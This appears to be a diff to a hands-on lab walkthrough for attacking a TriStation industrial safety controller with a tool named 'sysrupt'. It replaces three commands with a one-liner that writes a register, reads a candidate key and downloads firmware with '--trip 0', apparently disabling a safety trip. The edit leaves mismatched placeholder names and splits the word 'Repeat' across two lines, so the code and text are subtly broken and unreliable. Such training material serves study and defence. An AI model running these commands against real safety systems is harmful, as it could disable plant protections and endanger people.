@@ -98,10 +98,12 @@ window (Step 3) before trying the next.
 ```bash
 ./bin/sysrupt tristation write 1 1
 ./bin/sysrupt tristation read <KEY_CANDIDATE_REG>
-./bin/sysrupt tristation download --fw <FW_VALUE> --key <KEY_VALUE> --trip 0
+./bin/sysrupt tristation write 1 1 && KEY=$(./bin/sysrupt tristation read <CANDIDATE_KEY_REGISTER> | grep -oP 'reg <CANDIDATE_REG_KEY> = \K[0-9]+') && ./bin/sysrupt tristation download --fw <FW_KEY_VALUE> --key $KEY --trip 0
+
 ```
 
-Repeat per candidate until one returns success.
+Re
+peat per candidate until one returns success.
 </details>
 
 ## What You Learned
